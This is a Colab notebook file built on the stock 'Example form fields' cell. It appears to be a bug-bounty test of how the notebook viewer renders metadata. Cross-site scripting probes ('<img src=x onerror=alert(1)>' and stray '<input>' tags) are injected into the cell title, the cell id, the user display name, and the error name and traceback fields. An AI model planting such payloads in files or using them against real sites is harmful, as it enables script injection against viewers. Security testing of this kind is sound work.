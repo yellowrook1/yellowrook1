{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyPqVj14zs9ddAh6LN5tQwCR"
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "_GnZDSLxS8lu"
      },
      "outputs": [],
      "source": []
    },
    {
      "cell_type": "markdown",
      "source": [],
      "metadata": {
        "id": "0ewjRlylXLWO"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "# @title Exa<input id=a class=a></span></input>mple form fields { display-mode: \"both\" }\n",
        "# @markdown Forms support many types of fields.\n",
        "m\n",
        "no_type_checking = ''  # @param\n",
        "string_type = 'example'  # @param {type: \"string\"}\n",
        "slider_value =  1 # @param {type: \"slider\", min: 0, max: 200}\n",
        "number = 102  # @paraaam {type: \"number\"}\n",
        "date = '2010-11-05aa'  # @param {type: \"date\"}\n",
        "pick_me = \"monday\"  # @param ['monday', 'tuesday', 'wednesday', 'thursday']\n",
        "select_or_input = \"test\" # @param [\"t\", \"bananas\", \"oranges\"] {allow-input: true}\n",
        "# @markdown ---\n"
      ],
      "metadata": {
        "id": "X4W9BNrSUBJs\"Payload<img src=x onerror=alert(1)>",
        "executionInfo": {
          "status": "error",
          "timestamp": 1692324147082,
          "user_tz": 240,
          "elapsed": 186,
          "user": {
            "displayName": "Payload: <img src=x onerror=alert(1)>Bug Bounty",
            "userId": "14209090049436600841"
          }
        },
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 262
        },
        "outputId": "d978a043-5e3f-4e88-fd87-374e5f3ae1c4"
      },
      "execution_count": 3,
      "outputs": [
        {
          "output_type": "error",
          "ename": "NameError<img src=x onerror=alert(1)> <input>",
          "evalue": "ignored",
          "traceback": [
            "\u001b[0;31m----------------------------------------------------------------<img src=x onerror=alert(1)> <input>-----------\u001b[0m",
            "\u001b[0;31mNameError\u001b[0m <img src=x onerror=alert(1)> <input>Traceback (most recent call last)",
            "\u001b[0;32m<ipython-input-3-206e28b7d7f1>\u001b[0m i<img src=x onerror=alert(1)> <input>n \u001b[0;36m<cell line: 3>\u001b[0;34m()\u001b[0m\n\u001b[1;32m      1\u001b[0m \u001b[0;31m# @title Exa<input id=a class=a></span></input>mple form fields { display-mode: \"both\" }\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      2\u001b[0m \u001b[0;31m# @markdown Forms support many types of fields.\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m----> 3\u001b[0;31m \u001b[0mm\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m      4\u001b[0m \u001b[0mno_type_<img src=x onerror=alert(1)> <input>checking\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0;34m''\u001b[0m  \u001b[0;31m# @param\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      5\u001b[0m \u001b[0mstring_type\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0;34m'example'\u001b[0m  \u001b[0;31m# @param {type: \"string\"}\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;31mNameError\u001b[0m: name 'm' is not de<img src=x onerror=alert(1)> <input>fined"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [],
      "metadata": {
        "id": "oME5Uft5XKj6"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "# @title Example form fields { display-mode: \"both\" }\n",
        "# @markdown Forms support many types of fields.\n",
        "\n",
        "no_type_checking = ''  # @param\n",
        "string_type = 'example'  # @param {type: \"string\"}\n",
        "slider_value =  1 # @param {type: \"slider\", min: 0, max: 200}\n",
        "number = 102  # @param {type: \"number\"}\n",
        "date = '2010-11-05'  # @param {type: \"date\"}\n",
        "pick_me = \"monday\"  # @param ['monday', 'tuesday', 'wednesday', 'thursday']\n",
        "select_or_input = \"test\" # @param [\"t\", \"bananas\", \"oranges\"] {allow-input: true}\n",
        "# @markdown ---\n"
      ],
      "metadata": {
        "id": "WOKXTgyUXKZz"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [],
      "metadata": {
        "id": "eDSjVVYpXKNL"
      }
    },
    {
      "cell_type": "code",
      "source": [],
      "metadata": {
        "id": "zpuV3iPbXKEb"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}
